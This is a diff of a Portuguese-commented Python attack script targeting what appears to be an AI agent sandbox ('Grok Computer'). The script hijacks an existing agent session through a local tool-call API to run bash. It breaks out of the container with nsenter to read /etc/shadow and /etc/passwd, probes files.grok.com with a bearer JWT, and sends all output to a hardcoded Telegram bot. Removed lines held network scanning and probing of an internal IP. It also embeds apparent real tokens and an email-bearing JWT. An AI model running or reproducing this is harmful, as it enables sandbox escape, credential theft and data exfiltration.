@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Exploração final - combina Grok Files, API Grok Computer, scan de rede e proxy interno.
+Exploração final definitiva - Grok Files, API Grok Computer, e nsenter.
 """
 
 import subprocess
@@ -8,21 +8,13 @@ import json
 import requests
 import os
 import time
-import socket
-import re
 from datetime import datetime
 
-# ------------------------------------------------------------
-# CONFIGURAÇÃO
-# ------------------------------------------------------------
 TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
 TELEGRAM_CHAT_ID = "230885588"
 JWT = os.getenv("TERMINAL_JWT_VAL", "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiIyOGYwMDg5OC02NDQ3LTQzNDItYWU1ZS04YmM2NTdiNzYwNWIiLCJjaWQiOiJmMDFmMWVhOS0wYmUzLTQ5NWItOWI2Yy1kOTU3YWZiMzIwNTAiLCJlbWFpbCI6IndhbmRlcnNvbmx3bHdAZ21haWwuY29tIiwic2wiOiJMb2dnZWRJbiIsInB0IjoiMzJkZDVjNjktYzI5Mi00Zjk0LTlmN2QtM2ZhODYxZTg4MDBlIiwiZXhwIjoxNzg3ODA1ODM2LCJpYXQiOjE3ODc4MDIyMzZ9.XXXXX")  # substitua
-GROK_SESSION_ID = "6518367e-1ae0-40c0-9cc6-21b350742329"  # do ps
+GROK_SESSION_ID = "6518367e-1ae0-40c0-9cc6-21b350742329"
 
-# ------------------------------------------------------------
-# FUNÇÕES AUXILIARES
-# ------------------------------------------------------------
 def run_cmd(cmd, timeout=30):
     try:
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
@@ -58,177 +50,91 @@ def send_data(data_dict):
         else:
             send_telegram(f"📄 **{key}**\n```\n{content[:3000]}\n```")
 
-# ------------------------------------------------------------
-# 1. GROK FILES - LISTAR ARQUIVOS E UPLOAD
-# ------------------------------------------------------------
-def grok_files_list():
+# 1. Grok Files - obter conteúdo completo
+def grok_files_endpoints():
     base = "https://files.grok.com"
     headers = {"Authorization": f"Bearer {JWT}"}
-    # Tentar listar com parâmetros comuns
-    params_list = [
-        {},
-        {"limit": 10},
-        {"page": 1},
-        {"sort": "created_at"},
-        {"order": "desc"},
-        {"path": "/"},
-        {"recursive": "true"}
-    ]
+    endpoints = ["/v1/files", "/v1/list", "/api/v1/files", "/files", "/v1/users/me", "/v1/upload", "/v1/download", "/v1/share", "/v1/search"]
     results = {}
-    for params in params_list:
+    for ep in endpoints:
         try:
-            r = requests.get(f"{base}/v1/files", headers=headers, params=params, timeout=10)
-            results[f"GET /v1/files {params}"] = f"Status: {r.status_code}\n{str(r.text[:500])}"
+            r = requests.get(base + ep, headers=headers, timeout=10)
+            content = r.text if r.text else "(vazio)"
+            # Se for JSON, tentar formatar
+            if r.headers.get('content-type', '').startswith('application/json'):
+                try:
+                    parsed = r.json()
+                    content = json.dumps(parsed, indent=2)
+                except:
+                    pass
+            results[ep] = f"Status: {r.status_code}\n{content[:5000]}"
         except Exception as e:
-            results[f"GET /v1/files {params}"] = f"Erro: {e}"
-    # Tentar /v1/list com parâmetros
-    for params in params_list[:3]:
-        try:
-            r = requests.get(f"{base}/v1/list", headers=headers, params=params, timeout=10)
-            results[f"GET /v1/list {params}"] = f"Status: {r.status_code}\n{str(r.text[:500])}"
-        except Exception as e:
-            results[f"GET /v1/list {params}"] = f"Erro: {e}"
+            results[ep] = f"Erro: {e}"
     return results
 
-def grok_files_upload():
-    base = "https://files.grok.com"
-    headers = {"Authorization": f"Bearer {JWT}"}
-    # Criar um arquivo de teste
-    test_content = b"teste de upload via Grok Files"
-    files = {'file': ('teste.txt', test_content, 'text/plain')}
+# 2. API Grok Computer - usar sessão existente
+def grok_computer_call(command):
+    base = "http://127.0.0.1:4242"
+    headers = {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json"}
+    cmd_payload = {
+        "method": "tools/call",
+        "params": {
+            "name": "bash",
+            "arguments": {
+                "command": command,
+                "timeout": "30"
+            }
+        }
+    }
     try:
-        r = requests.post(f"{base}/v1/upload", headers=headers, files=files, timeout=10)
-        return f"Status: {r.status_code}\n{r.text[:500]}"
+        r = requests.post(
+            f"{base}/sessions/{GROK_SESSION_ID}/tools/call",
+            headers=headers,
+            json=cmd_payload,
+            timeout=30
+        )
+        return f"Status: {r.status_code}\n{r.text[:2000]}"
     except Exception as e:
         return f"Erro: {e}"
 
-# ------------------------------------------------------------
-# 2. API GROK COMPUTER - USAR SESSÃO EXISTENTE
-# ------------------------------------------------------------
-def grok_computer_execute(command):
-    base = "http://127.0.0.1:4242"
-    headers = {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json"}
-    # Primeiro, tentar listar sessões (GET /sessions)
-    try:
-        r = requests.get(f"{base}/sessions", headers=headers, timeout=5)
-        sessions_info = f"GET /sessions: {r.status_code} - {r.text[:200]}"
-    except Exception as e:
-        sessions_info = f"GET /sessions erro: {e}"
-    # Agora usar a sessão conhecida
-    if GROK_SESSION_ID:
-        cmd_payload = {
-            "method": "tools/call",
-            "params": {
-                "name": "bash",
-                "arguments": {
-                    "command": command,
-                    "timeout": "30"
-                }
-            }
-        }
-        try:
-            r = requests.post(
-                f"{base}/sessions/{GROK_SESSION_ID}/tools/call",
-                headers=headers,
-                json=cmd_payload,
-                timeout=30
-            )
-            exec_result = f"POST /sessions/{GROK_SESSION_ID}/tools/call\nStatus: {r.status_code}\n{r.text[:1000]}"
-        except Exception as e:
-            exec_result = f"Erro ao executar: {e}"
-        return sessions_info + "\n\n" + exec_result
-    else:
-        return sessions_info
-
-# ------------------------------------------------------------
-# 3. DESCOBRIR REDE E FAZER SCAN
-# ------------------------------------------------------------
-def get_container_ip():
-    # Tenta obter IP do container
-    ip = run_cmd("hostname -I 2>/dev/null | awk '{print $1}'")
-    if ip and "ERRO" not in ip:
-        return ip
-    # Fallback via ip route
-    ip = run_cmd("ip route get 1 | awk '{print $NF;exit}' 2>/dev/null")
-    if ip and "ERRO" not in ip:
-        return ip
-    # Fallback via nsenter
-    ip = run_cmd("nsenter -t 1 -n -- hostname -I 2>/dev/null | awk '{print $1}'")
-    if ip and "ERRO" not in ip:
-        return ip
-    return None
-
-def network_scan_with_nmap(ip):
-    # Tenta usar nmap via nsenter
-    if "ERRO" not in run_cmd("which nmap"):
-        # Escaneia a sub-rede /24 do IP
-        subnet = ip.rsplit('.', 1)[0] + ".0/24"
-        cmd = f"nsenter -t 1 -n -- nmap -p 443,6443,8080,9090,4242,22,2379,10250,80,8081,8082 -T4 {subnet} -oG - | grep '/open/'"
-        return run_cmd(cmd, timeout=120)
-    else:
-        # Usa bash + nc (mais lento)
-        return "Nmap não encontrado, scan manual não implementado."
-
-# ------------------------------------------------------------
-# 4. EXPLORAR PROXY INTERNO (35.245.43.102)
-# ------------------------------------------------------------
-def explore_internal_proxy():
-    base = "http://35.245.43.102"
-    ports = [80, 8080, 8081, 8082, 443, 8083]
+# 3. Comandos no host via nsenter
+def host_commands():
+    cmds = {
+        "whoami": "whoami",
+        "hostname": "hostname",
+        "id": "id",
+        "ps_aux": "ps auxfww",
+        "netstat": "netstat -tulpn 2>/dev/null || ss -tulpn",
+        "mount": "mount",
+        "cat_shadow": "cat /etc/shadow 2>/dev/null || echo 'N/A'",
+        "cat_passwd": "cat /etc/passwd 2>/dev/null || echo 'N/A'",
+    }
     results = {}
-    for port in ports:
-        url = f"{base}:{port}"
-        try:
-            r = requests.get(url, timeout=3)
-            results[port] = f"Status: {r.status_code} - {r.text[:100]}"
-        except:
-            results[port] = "Timeout ou conexão recusada"
+    for name, cmd in cmds.items():
+        # Usar nsenter com todos os namespaces
+        full_cmd = f"nsenter -t 1 -m -u -i -n -p -- {cmd}"
+        output = run_cmd(full_cmd, timeout=20)
+        results[name] = output if output else "N/A"
     return results
 
-# ------------------------------------------------------------
-# FUNÇÃO PRINCIPAL
-# ------------------------------------------------------------
 def main():
-    send_telegram("🚀 **Iniciando exploração final**")
+    send_telegram("🚀 **Iniciando exploração final definitiva**")
 
-    # 1. Grok Files - listagem e upload
-    send_telegram("🔍 Listando arquivos no Grok Files...")
-    list_results = grok_files_list()
-    for k, v in list_results.items():
-        send_telegram(f"📄 **{k}**\n```\n{v[:500]}\n```")
-    send_telegram("📤 Testando upload no Grok Files...")
-    upload_res = grok_files_upload()
-    send_telegram(f"📄 **Upload**\n```\n{upload_res[:500]}\n```")
+    # 1. Grok Files - ver conteúdo
+    send_telegram("🔍 Obtendo conteúdo dos endpoints Grok Files...")
+    grok_data = grok_files_endpoints()
+    send_data(grok_data)
 
-    # 2. API Grok Computer com sessão existente
-    send_telegram("🔄 Testando API Grok Computer (sessão existente)...")
-    grok_res = grok_computer_execute("whoami")
-    send_telegram(f"📄 **Grok API**\n```\n{grok_res[:1000]}\n```")
-
-    # 3. Scan de rede
-    container_ip = get_container_ip()
-    if container_ip and "ERRO" not in container_ip:
-        send_telegram(f"🔍 IP do container: `{container_ip}`. Escaneando rede...")
-        scan_res = network_scan_with_nmap(container_ip)
-        if scan_res and "ERRO" not in scan_res and len(scan_res) > 10:
-            if len(scan_res) > 4000:
-                tmp = "/tmp/scan.txt"
-                with open(tmp, "w") as f:
-                    f.write(scan_res)
-                send_file(tmp, caption="📄 Resultado do scan")
-                os.remove(tmp)
-            else:
-                send_telegram(f"📄 **Scan**\n```\n{scan_res[:3000]}\n```")
-        else:
-            send_telegram("❌ Nenhum host encontrado no scan.")
-    else:
-        send_telegram("❌ Não foi possível obter IP do container.")
-
-    # 4. Explorar proxy interno
-    send_telegram("🔍 Explorando proxy interno (35.245.43.102)...")
-    proxy_res = explore_internal_proxy()
-    for port, info in proxy_res.items():
-        send_telegram(f"📄 **Porta {port}**\n```\n{info}\n```")
+    # 2. API Grok Computer - comando de teste
+    send_telegram("🔄 Testando API Grok Computer com sessão existente...")
+    grok_result = grok_computer_call("whoami")
+    send_telegram(f"📄 **Grok API response**\n```\n{grok_result[:2000]}\n```")
+    if "whoami" not in grok_result:
+        send_telegram("⚠️ API Grok Computer não respondeu com o comando. Tentando outros métodos...")
+        # 3. nsenter diretamente
+        send_telegram("🔧 Executando comandos via nsenter...")
+        host_results = host_commands()
+        send_data(host_results)
 
     send_telegram("✅ **Exploração finalizada**")
 
